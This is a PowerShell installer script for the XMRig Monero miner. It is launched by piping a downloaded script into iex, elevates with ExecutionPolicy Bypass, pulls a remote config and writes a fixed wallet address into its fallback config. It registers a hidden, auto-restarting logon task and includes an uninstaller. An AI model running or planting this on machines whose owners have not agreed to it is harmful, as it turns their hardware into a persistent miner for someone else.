# XMRig Transparent Installer
# Downloads XMRig, installs it under the invoking user's %LOCALAPPDATA%,
# registers a scheduled task that runs it at logon (mutex-guarded, auto-
# restarting), and starts it once.
#
# Design goals:
#   - Transparent: honest UAC prompt, visible console output at every step.
#   - Per-user: installs to %LOCALAPPDATA%\Programs\XMRig; no system paths.
#   - Single instance: named mutex prevents duplicate miners on the same user.
#   - Self-healing: inline restart loop so a pool blip does not kill mining
#     until next reboot.
#   - No extra script files on disk beyond xmrig.exe, config.json, uninstall.ps1.
#
# Usage:
#   irm https://raw.githubusercontent.com/Vicistar-V/xmrig/main/install_clean.ps1 | iex

param(
    [string]$OrigUser         = $env:USERNAME,
    [string]$OrigLocalAppData = $env:LOCALAPPDATA
)

$ErrorActionPreference = "Stop"
$ProgressPreference    = "SilentlyContinue"

# GitHub requires TLS 1.2+; PS 5.1 on stock Win10 defaults to TLS 1.0/1.1.
# Set this before any web request — otherwise every download fails.
try {
    [Net.ServicePointManager]::SecurityProtocol =
        [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
} catch {}

function Write-Step($msg) { Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok  ($msg) { Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Warn($msg) { Write-Host "[!] $msg" -ForegroundColor Yellow }
function Write-Err ($msg) { Write-Host "[x] $msg" -ForegroundColor Red }

# ---------------------------------------------------------------------------
# 1. Elevation — honest UAC prompt, no registry tampering.
#    We capture the ORIGINAL user's identity BEFORE elevating so the elevated
#    child installs into that user's LOCALAPPDATA and registers the scheduled
#    task at that user's logon (not Administrator's).
# ---------------------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal] `
            [Security.Principal.WindowsIdentity]::GetCurrent()
          ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Warn "Administrator rights required. Re-launching with UAC prompt..."
    $capturedUser         = $env:USERNAME
    $capturedLocalAppData = $env:LOCALAPPDATA

    $scriptPath = $MyInvocation.MyCommand.Path
    if (-not $scriptPath) {
        # Running via `irm | iex` — persist the current script body to a temp file
        # so the elevated child can re-execute it with parameters.
        $scriptPath = Join-Path $env:TEMP "xmrig_installer.ps1"
        $MyInvocation.MyCommand.ScriptBlock.ToString() |
            Set-Content -Path $scriptPath -Encoding UTF8 -Force
    }

    $childArgs = @(
        "-ExecutionPolicy","Bypass","-NoProfile","-File","`"$scriptPath`"",
        "-OrigUser","`"$capturedUser`"",
        "-OrigLocalAppData","`"$capturedLocalAppData`""
    ) -join " "

    Start-Process -FilePath "powershell.exe" -ArgumentList $childArgs -Verb RunAs
    exit
}

# ---------------------------------------------------------------------------
# 1b. Single-instance guard for the installer itself (Local\, not Global\)
# ---------------------------------------------------------------------------
$installerMutex = New-Object System.Threading.Mutex($false, "Local\XMRigInstallerMutex")
if (-not $installerMutex.WaitOne(0, $false)) {
    Write-Warn "Another XMRig installer is already running. Exiting."
    exit
}

# ---------------------------------------------------------------------------
# 2. Configuration — uses ORIGINAL user's paths, not the elevated Admin's.
# ---------------------------------------------------------------------------
$installDir   = Join-Path $OrigLocalAppData "Programs\XMRig"
$xmrigVersion = "6.21.0"
$xmrigUrl     = "https://github.com/xmrig/xmrig/releases/download/v$xmrigVersion/xmrig-$xmrigVersion-gcc-win64.zip"
$xmrigZip     = Join-Path $env:TEMP "xmrig-$xmrigVersion.zip"
$extractDir   = Join-Path $env:TEMP "xmrig-$xmrigVersion-extract"
$configUrl    = "https://raw.githubusercontent.com/Vicistar-V/xmrig/main/config.json"
$taskName     = "XMRig Miner"
$taskDesc     = "Runs the XMRig Monero miner at user logon."
$rigId        = $env:COMPUTERNAME

Write-Host ""
Write-Host "=== XMRig Transparent Installer ===" -ForegroundColor White
Write-Host "User (target)     : $OrigUser"
Write-Host "Install directory : $installDir"
Write-Host "XMRig version     : $xmrigVersion"
Write-Host "Scheduled task    : $taskName"
Write-Host "Rig ID            : $rigId"
Write-Host ""

# ---------------------------------------------------------------------------
# 3. Prepare install directory
# ---------------------------------------------------------------------------
Write-Step "Preparing install directory"
if (-not (Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
}
Write-Ok  "Ready: $installDir"

# ---------------------------------------------------------------------------
# 4. Stop any existing miner + task so we can update cleanly
# ---------------------------------------------------------------------------
Write-Step "Stopping any existing XMRig instance"
Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | ForEach-Object {
    try { $_ | Stop-Process -Force; Write-Ok "Stopped PID $($_.Id)" } catch {}
}
$existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if ($existingTask) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    Write-Ok "Removed previous scheduled task"
}

# ---------------------------------------------------------------------------
# 5. Download XMRig (skip if already present)
# ---------------------------------------------------------------------------
$xmrigExe = Join-Path $installDir "xmrig.exe"
if (-not (Test-Path $xmrigExe)) {
    Write-Step "Downloading XMRig $xmrigVersion"
    try {
        Invoke-WebRequest -Uri $xmrigUrl -OutFile $xmrigZip -UseBasicParsing
    } catch {
        Write-Warn "Invoke-WebRequest failed, falling back to WebClient"
        (New-Object System.Net.WebClient).DownloadFile($xmrigUrl, $xmrigZip)
    }
    Write-Ok "Downloaded: $xmrigZip"

    Write-Step "Extracting archive"
    if (Test-Path $extractDir) { Remove-Item -Recurse -Force $extractDir }
    Expand-Archive -Path $xmrigZip -DestinationPath $extractDir -Force

    # Copy the whole extracted folder (xmrig.exe + WinRing0x64.sys driver so
    # MSR mods can load, if the user's machine allows it).
    $srcRoot = Get-ChildItem -Path $extractDir -Directory | Select-Object -First 1
    if (-not $srcRoot) { throw "Extracted archive is empty." }
    Get-ChildItem -Path $srcRoot.FullName -File | ForEach-Object {
        Copy-Item -Path $_.FullName -Destination (Join-Path $installDir $_.Name) -Force
    }
    if (-not (Test-Path $xmrigExe)) { throw "xmrig.exe not found in archive." }
    Write-Ok "Installed: $xmrigExe"

    Remove-Item -Path $xmrigZip   -Force          -ErrorAction SilentlyContinue
    Remove-Item -Path $extractDir -Recurse -Force -ErrorAction SilentlyContinue
} else {
    Write-Ok "XMRig already present, skipping download"
}

# ---------------------------------------------------------------------------
# 6. Fetch config.json — validate JSON before writing; fall back if invalid.
# ---------------------------------------------------------------------------
$configPath = Join-Path $installDir "config.json"
Write-Step "Writing config.json"

$configContent = $null
try {
    $configContent = Invoke-WebRequest -Uri $configUrl -UseBasicParsing |
                     Select-Object -ExpandProperty Content
    # Validate it's real JSON before saving — a corrupt remote breaks the miner.
    $null = $configContent | ConvertFrom-Json
    Write-Ok "Fetched and validated config from $configUrl"
} catch {
    Write-Warn "Remote config unavailable or invalid — using inline default"
    $configContent = $null
}

if (-not $configContent) {
    $logEsc = ($installDir -replace '\\','\\') + '\\xmrig.log'
    $configContent = @"
{
    "autosave": true,
    "cpu": { "enabled": true, "huge-pages": true, "yield": true, "priority": 0 },
    "opencl": { "enabled": false },
    "cuda":   { "enabled": false },
    "donate-level": 1,
    "log-file": "$logEsc",
    "pools": [
        {
            "coin": "XMR",
            "url":  "xmrpool.eu:8888",
            "user": "4AHxVmrWgk2SyHFLR9LoGxhW14fxe8cDQbKFfoyhWtavJVdUVREUP33jBkQtqSPfw4HZLAgEiA9SkbwXaXCqRMj44VuQ4n9",
            "pass": "x",
            "rig-id": "$rigId",
            "keepalive": true,
            "tls": true
        }
    ],
    "retries": 0,
    "retry-pause": 5,
    "print-time": 60,
    "watch": true,
    "pause-on-battery": true,
    "pause-on-active": true
}
"@
}

# Inject this machine's hostname into rig-id so per-worker pool stats work,
# regardless of whether the field was null / missing / already set.
try {
    $parsed = $configContent | ConvertFrom-Json
    if ($parsed.pools -and $parsed.pools.Count -gt 0) {
        $parsed.pools[0].'rig-id' = $rigId
        $configContent = $parsed | ConvertTo-Json -Depth 10
    }
} catch {}

Set-Content -Path $configPath -Value $configContent -Encoding UTF8 -Force
Write-Ok "Wrote config: $configPath"

# ---------------------------------------------------------------------------
# 7. Ship uninstall.ps1 — cleanly removes the miner even though the script
#    itself lives inside the folder it needs to delete.
# ---------------------------------------------------------------------------
Write-Step "Writing uninstall.ps1"
$uninstallScript = @'
# XMRig Uninstaller — stops the miner, removes the scheduled task, deletes files.
$ErrorActionPreference = "SilentlyContinue"
$taskName   = "XMRig Miner"
$installDir = $PSScriptRoot

Write-Host "Stopping XMRig..." -ForegroundColor Cyan
Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force

# Kill any launcher powershell holding the mutex for this install.
Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" |
    Where-Object { $_.CommandLine -like "*XMRigMinerMutex*" } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force }

Write-Host "Removing scheduled task..." -ForegroundColor Cyan
Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue |
    Unregister-ScheduledTask -Confirm:$false

# Move out of the install dir so Windows will let us delete it,
# then hand the recursive delete to a detached cmd so this script
# can delete its own containing folder.
Set-Location $env:TEMP
Write-Host "Scheduling folder deletion..." -ForegroundColor Cyan
Start-Process -FilePath "cmd.exe" `
    -ArgumentList "/c timeout /t 2 /nobreak > nul & rd /s /q `"$installDir`"" `
    -WindowStyle Hidden

Write-Host "XMRig uninstalled." -ForegroundColor Green
'@
Set-Content -Path (Join-Path $installDir "uninstall.ps1") `
    -Value $uninstallScript -Encoding UTF8 -Force
Write-Ok "Wrote uninstall.ps1"

# ---------------------------------------------------------------------------
# 8. Build the inline mutex-guarded, auto-restarting miner command.
#
#    Rationale for every piece:
#      - Local\ mutex: standard users can create it (Global\ needs privilege).
#      - Escaped double quotes around paths: survives usernames with apostrophes.
#      - while($true) loop: if xmrig exits (crash, prolonged pool outage), the
#        launcher restarts it after a short sleep instead of dying and waiting
#        for the next logon. Mutex stays held for the whole session so we still
#        can't spawn a duplicate from a second logon.
# ---------------------------------------------------------------------------
$mutexName = "Local\XMRigMinerMutex"
$xmrigEsc     = $xmrigExe   -replace '"','""'
$installDirEsc= $installDir -replace '"','""'

$minerCmd = @"
`$c=`$false; `$m=New-Object System.Threading.Mutex(`$true,'$mutexName',[ref]`$c); if(-not `$c){exit};
try{ while(`$true){ try{ (Start-Process -FilePath "$xmrigEsc" -WorkingDirectory "$installDirEsc" -PassThru).WaitForExit() }catch{} ; Start-Sleep -Seconds 30 } }
finally{ `$m.ReleaseMutex(); `$m.Dispose() }
"@ -replace "`r?`n"," "

$psArgs = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$minerCmd`""

# ---------------------------------------------------------------------------
# 9. Register the scheduled task under the ORIGINAL user (not Administrator).
# ---------------------------------------------------------------------------
Write-Step "Registering scheduled task '$taskName' for user '$OrigUser'"

# Resolve full DOMAIN\User for New-ScheduledTaskPrincipal.
$origUserFull = if ($OrigUser -like "*\*") { $OrigUser } else { "$env:COMPUTERNAME\$OrigUser" }

$action    = New-ScheduledTaskAction `
                -Execute "powershell.exe" `
                -Argument $psArgs `
                -WorkingDirectory $installDir
$trigger   = New-ScheduledTaskTrigger   -AtLogOn -User $origUserFull
$principal = New-ScheduledTaskPrincipal -UserId $origUserFull -RunLevel Highest
$settings  = New-ScheduledTaskSettingsSet `
                -AllowStartIfOnBatteries `
                -DontStopIfGoingOnBatteries `
                -StartWhenAvailable `
                -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)

Register-ScheduledTask -TaskName $taskName `
    -Action $action -Trigger $trigger -Principal $principal `
    -Settings $settings -Description $taskDesc -Force | Out-Null
Write-Ok "Scheduled task registered"

# ---------------------------------------------------------------------------
# 10. Start the miner now via the same mutex-guarded command.
#     (We start it as the current elevated identity — if the elevated user
#     differs from $OrigUser this run will mine under the elevated account
#     until next logon, when the scheduled task takes over as $OrigUser.)
# ---------------------------------------------------------------------------
Write-Step "Starting XMRig"
Start-Process -FilePath "powershell.exe" -ArgumentList $psArgs -WorkingDirectory $installDir
Write-Ok "XMRig started"

Write-Host ""
Write-Host "=== Install complete ===" -ForegroundColor Green
Write-Host "Config    : $configPath"
Write-Host "Log file  : $installDir\xmrig.log"
Write-Host "Uninstall : powershell -ExecutionPolicy Bypass -File `"$installDir\uninstall.ps1`""
Write-Host ""
Write-Host "Note: for best RandomX hashrate, grant your account the 'Lock Pages" -ForegroundColor DarkGray
Write-Host "in Memory' privilege (secpol.msc -> Local Policies -> User Rights" -ForegroundColor DarkGray
Write-Host "Assignment) and log out/in. Otherwise huge-pages will fall back to" -ForegroundColor DarkGray
Write-Host "normal pages and lose ~10-20% hashrate." -ForegroundColor DarkGray
Write-Host ""
